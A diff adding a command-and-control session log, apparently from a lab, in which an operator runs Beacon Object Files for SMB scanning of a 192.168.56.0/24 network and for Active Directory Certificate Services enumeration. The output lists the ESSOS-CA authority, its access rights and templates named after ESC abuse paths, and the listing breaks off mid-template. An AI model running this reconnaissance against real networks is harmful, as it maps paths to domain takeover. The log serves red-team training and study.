@@ -1,0 +1,1838 @@
+
+[02/01 00:06:56] qwer [94e33791] beacon > execute bof ~/Downloads/bof-scan/Extension-Kit/Scan-BOF/_bin/scan_bof.x64.o 192.168.56.22
+[02/01 00:06:56] [*] Task: execute BOF
+[02/01 00:07:00] [*] Agent called server, sent [1.32 Kb]
+[02/01 00:07:00] [+] BOF output
+[*] Starting NetExec-style scan
+Windows Server (name:56.22) (domain:56.22)
+ (signing:False) (SMBv1:False)
+
+[+] Scan completed
+[02/01 00:07:00] [+] BOF finished
+
++--- Task [94e33791] closed ----------------------------------------------------------+
+
+beacon > 1
+[-] Command not found
+
++-------------------------------------------------------------------------------------+
+
+[02/01 00:09:02] qwer [8b352ee4] beacon > execute bof ~/Downloads/bof-scan/Extension-Kit/Scan-BOF/_bin/scan_bof.x64.o 192.168.56.22
+[02/01 00:09:02] [*] Task: execute BOF
+[02/01 00:09:05] [*] Agent called server, sent [5.58 Kb]
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_WSAStartup
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_socket
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_ioctlsocket
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_closesocket
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_htons
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_inet_addr
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_connect
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_WSAGetLastError
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_select
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_getsockopt
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_WSAStartup
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_socket
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_ioctlsocket
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_closesocket
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_htons
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_inet_addr
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_connect
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_WSAGetLastError
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_select
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_getsockopt
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_send
+[02/01 00:09:05] [-] BOF error
+Symbol not found: __imp_recv
+[02/01 00:09:05] [-] BOF error
+Symbol not found: sscanf
+[02/01 00:09:05] [-] BOF error
+Symbol not found: sprintf
+[02/01 00:09:05] [-] BOF error
+Symbol not found: sscanf
+[02/01 00:09:05] [-] BOF error
+Symbol not found: sscanf
+[02/01 00:09:05] [-] BOF error
+Symbol not found: strchr
+[02/01 00:09:05] [-] BOF error
+Symbol not found: strrchr
+[02/01 00:09:05] [-] BOF error
+Symbol not found: sprintf
+[02/01 00:09:05] [-] BOF error
+Symbol not found: strcpy
+[02/01 00:09:05] [-] BOF error
+Symbol not found: strcpy
+[02/01 00:09:05] [-] BOF error
+Symbol not found: strtok
+[02/01 00:09:05] [-] BOF error
+Symbol not found: strlen
+[02/01 00:09:05] [-] BOF error
+Symbol not found: strchr
+[02/01 00:09:05] [-] BOF error
+Symbol not found: strchr
+[02/01 00:09:05] [-] BOF error
+Symbol not found: strcpy
+[02/01 00:09:05] [+] BOF finished
+
++--- Task [8b352ee4] closed ----------------------------------------------------------+
+
+[02/01 00:10:20] qwer [87a234a3] beacon > execute bof ~/Downloads/bof-scan/Extension-Kit/Scan-BOF/_bin/scan_bof.x64.o 192.168.56.22
+[02/01 00:10:20] [*] Task: execute BOF
+[02/01 00:10:21] [*] Agent called server, sent [1.44 Kb]
+[02/01 00:10:21] [-] BOF error
+Symbol not found: strcpy
+[02/01 00:10:21] [+] BOF finished
+
++--- Task [87a234a3] closed ----------------------------------------------------------+
+
+[02/01 00:10:45] qwer [bc2222a1] beacon > execute bof ~/Downloads/bof-scan/Extension-Kit/Scan-BOF/_bin/scan_bof.x64.o 192.168.56.22
+[02/01 00:10:45] [*] Task: execute BOF
+[02/01 00:10:45] [*] Agent called server, sent [1.44 Kb]
+[02/01 00:10:45] [-] BOF error
+Symbol not found: strcpy
+[02/01 00:10:45] [+] BOF finished
+
++--- Task [bc2222a1] closed ----------------------------------------------------------+
+
+[02/01 00:12:01] qwer [59fcb37e] beacon > execute bof ~/Downloads/bof-scan/Extension-Kit/Scan-BOF/_bin/scan_bof.x64.o 192.168.56.22
+[02/01 00:12:01] [*] Task: execute BOF
+[02/01 00:12:01] [*] Agent called server, sent [867 bytes]
+[02/01 00:12:01] [+] BOF output
+[*] Starting NetExec-style scan
+Windows Server (name:192.168.56.22) (domain:192.168.56.22) (signing:True) (SMBv1:False)
+[+] Scan completed
+[02/01 00:12:01] [+] BOF finished
+
++--- Task [59fcb37e] closed ----------------------------------------------------------+
+
+[02/01 00:12:27] qwer [02849196] beacon > execute bof ~/Downloads/bof-scan/Extension-Kit/Scan-BOF/_bin/scan_bof.x64.o 192.168.56.0/24
+[02/01 00:12:27] [*] Task: execute BOF
+[02/01 00:12:30] [*] Agent called server, sent [869 bytes]
+[02/01 00:12:30] [+] BOF output
+[*] Starting NetExec-style scan
+Windows Server (name:192.168.56.22) (domain:192.168.56.22) (signing:True) (SMBv1:False)
+[+] Scan completed
+[02/01 00:12:30] [+] BOF finished
+
++--- Task [02849196] closed ----------------------------------------------------------+
+
+[02/01 00:12:35] qwer [69259311] beacon > execute bof ~/Downloads/bof-scan/Extension-Kit/Scan-BOF/_bin/scan_bof.x64.o 192.168.56.0/24
+[02/01 00:12:35] [*] Task: execute BOF
+[02/01 00:12:37] [*] Agent called server, sent [869 bytes]
+[02/01 00:12:37] [+] BOF output
+[*] Starting NetExec-style scan
+Windows Server (name:192.168.56.22) (domain:192.168.56.22) (signing:True) (SMBv1:False)
+[+] Scan completed
+[02/01 00:12:37] [+] BOF finished
+
++--- Task [69259311] closed ----------------------------------------------------------+
+
+[02/01 00:12:41] qwer [26c56708] beacon > execute bof ~/Downloads/bof-scan/Extension-Kit/Scan-BOF/_bin/scan_bof.x64.o 192.168.56.12
+[02/01 00:12:41] [*] Task: execute BOF
+[02/01 00:12:45] [*] Agent called server, sent [867 bytes]
+[02/01 00:12:45] [+] BOF output
+[*] Starting NetExec-style scan
+Windows Server (name:192.168.56.22) (domain:192.168.56.22) (signing:True) (SMBv1:False)
+[+] Scan completed
+[02/01 00:12:45] [+] BOF finished
+
++--- Task [26c56708] closed ----------------------------------------------------------+
+
+[02/01 00:12:58] qwer [2e721f82] beacon > execute bof ~/Downloads/bof-scan/Extension-Kit/Scan-BOF/_bin/scan_bof.x64.o 192.168.56.11
+[02/01 00:12:58] [*] Task: execute BOF
+[02/01 00:12:58] [*] Agent called server, sent [867 bytes]
+[02/01 00:12:58] [+] BOF output
+[*] Starting NetExec-style scan
+Windows Server (name:192.168.56.22) (domain:192.168.56.22) (signing:True) (SMBv1:False)
+[+] Scan completed
+[02/01 00:12:58] [+] BOF finished
+
++--- Task [2e721f82] closed ----------------------------------------------------------+
+
+[02/01 00:14:24] qwer [7c117b62] beacon > execute bof ~/Downloads/Extension-Kit/AD-BOF/_bin/ADCS/certi_enum.x64.o
+[02/01 00:14:24] [*] Task: execute BOF
+[02/01 00:14:25] [*] Agent called server, sent [24.47 Kb]
+[02/01 00:14:26] [+] BOF output
+
+[*] Found 1 policy servers
+
+[*] Enumerating enrollment policy servers for Active Directory Enrollment Policy...
+
+[*] Found 1 CAs
+
+[*] Listing info about the Enterprise CA 'ESSOS-CA'
+    Enterprise CA Name       : ESSOS-CA
+    DNS Hostname             : braavos.essos.local
+    Distinguished Name       : CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
+    CA Certificate           :
+      Subject Name           : DC=local, DC=essos, CN=ESSOS-CA
+      Thumbprint             : a0ab771cfeb8ca1689c7dc97bd7bed0218fc9e2c
+      Serial Number          : aca5caa02e8a204c966647657ae00a74
+      Start Date             : 11/30/2025 10:04:45
+      End Date               : 11/30/2030 10:14:45
+      Chain                  : DC=local, DC=essos, CN=ESSOS-CA
+    CA Permissions           :
+      Owner                  : ESSOS\Enterprise Admins
+                               S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights          :
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00000100
+          Flags             : 00000001
+          Flags             : 00000001
+                              Extended right {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+                              Enrollment Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+          Flags             : 00000501
+                              Read Rights
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\BRAAVOS$ (S-1-5-21-76206382-3835729989-2750497531-1104)
+          Access mask       : 000F00FF
+          Flags             : 00000501
+                              Read Rights
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+          Flags             : 00000101
+                              Read Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F01FF
+          Flags             : 00000501
+                              Read Rights
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01BD
+          Flags             : 00000501
+                              Read Rights
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+    Web Servers              :
+      N/A
+    Templates                :
+      ESC13
+      ESC9
+      ESC4
+      ESC3-CRA
+      ESC3
+      ESC2
+      ESC1
+      DirectoryEmailReplication
+      DomainControllerAuthentication
+      KerberosAuthentication
+      EFSRecovery
+      EFS
+      DomainController
+      WebServer
+      Machine
+      User
+      SubCA
+      Administrator
+
+[*] Listing info about the template 'CAExchange'
+    Template Name            : CAExchange
+    Template Friendly Name   : CA Exchange
+    Validity Period          : 0 years (604800 seconds)
+    Renewal Period           : 1 days (86400 seconds)
+    Name Flags               : SubjectNameEnrolleeSupplies
+    Enrollment Flags         : EnrollmentIncludeSymmetricAlgorithms
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Private Key Archival
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'CEPEncryption'
+    Template Name            : CEPEncryption
+    Template Friendly Name   : CEP Encryption
+    Validity Period          : 2 years (63072000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameEnrolleeSupplies
+    Enrollment Flags         :
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Certificate Request Agent
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'CodeSigning'
+    Template Name            : CodeSigning
+    Template Friendly Name   : Code Signing
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireDirectoryPath SubjectAlternativeNameRequireUPN
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Code Signing
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'Machine'
+    Template Name            : Machine
+    Template Friendly Name   : Computer
+    Validity Period          : 1 years (3
+1536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireDNS SubjectAlternativeNameRequireDNS
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Client Authentication
+      Server Authentication
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Computers (S-1-5-21-76206382-3835729989-2750497531-515)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'CrossCA'
+    Template Name            : CrossCA
+    Template Friendly Name   : Cross Certification Authority
+    Validity Period          : 5 years (157680000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameEnrolleeSupplies
+    Enrollment Flags         : EnrollmentPublishToDS
+    Signatures Required      : 1
+    Extended Key Usages      :
+      N/A
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'DirectoryEmailReplication'
+    Template Name            : DirectoryEmailReplication
+    Template Friendly Name   : Directory Email Replication
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectAlternativeNameRequireDirectoryGUID SubjectAlternativeNameRequireDNS
+    Enrollment Flags         : EnrollmentIncludeSymmetricAlgorithms EnrollmentPublishToDS EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Directory Service Email Replication
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Enterprise Read-only Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-498)
+          Access mask       : 00000110
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Enterprise Read-only Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-498)
+          Access mask       : 00000110
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-516)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-516)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {A05B8CC2-17BC-4802-A710-E7C15AB866A2}
+        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS (S-1-5-9)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS (S-1-5-9)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {A05B8CC2-17BC-4802-A710-E7C15AB866A2}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'DomainController'
+    Template Name            : DomainController
+    Template Friendly Name   : Domain Controller
+    Validity Period          : 1 years
+(31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireDNS SubjectAlternativeNameRequireDirectoryGUID SubjectAlternativeNameRequireDNS
+    Enrollment Flags         : EnrollmentIncludeSymmetricAlgorithms EnrollmentPublishToDS EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Client Authentication
+      Server Authentication
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Enterprise Read-only Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-498)
+          Access mask       : 00000110
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-516)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS (S-1-5-9)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'DomainControllerAuthentication'
+    Template Name            : DomainControllerAuthentication
+    Template Friendly Name   : Domain Controller Authentication
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectAlternativeNameRequireDNS
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Client Authentication
+      Server Authentication
+      Smart Card Logon
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Enterprise Read-only Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-498)
+          Access mask       : 00000110
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Enterprise Read-only Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-498)
+          Access mask       : 00000110
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-516)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-516)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {A05B8CC2-17BC-4802-A710-E7C15AB866A2}
+        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS (S-1-5-9)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS (S-1-5-9)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {A05B8CC2-17BC-4802-A710-E7C15AB866A2}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'EFSRecovery'
+    Template Name            : EFSRecovery
+    Template Friendly Name   : EFS Recovery Agent
+    Validity Period          : 5 years (157680000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireDirectoryPath SubjectAlternativeNameRequireUPN
+    Enrollment Flags         : EnrollmentIncludeSymmetricAlgorithms EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      File Recovery
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                        WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'EnrollmentAgent'
+    Template Name            : EnrollmentAgent
+    Template Friendly Name   : Enrollment Agent
+    Validity Period          : 2 years (63072000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireDirectoryPath SubjectAlternativeNameRequireUPN
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Certificate Request Agent
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'MachineEnrollmentAgent'
+    Template Name            : MachineEnrollmentAgent
+    Template Friendly Name   : Enrollment Agent (Computer)
+    Validity Period          : 2 years (63072000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
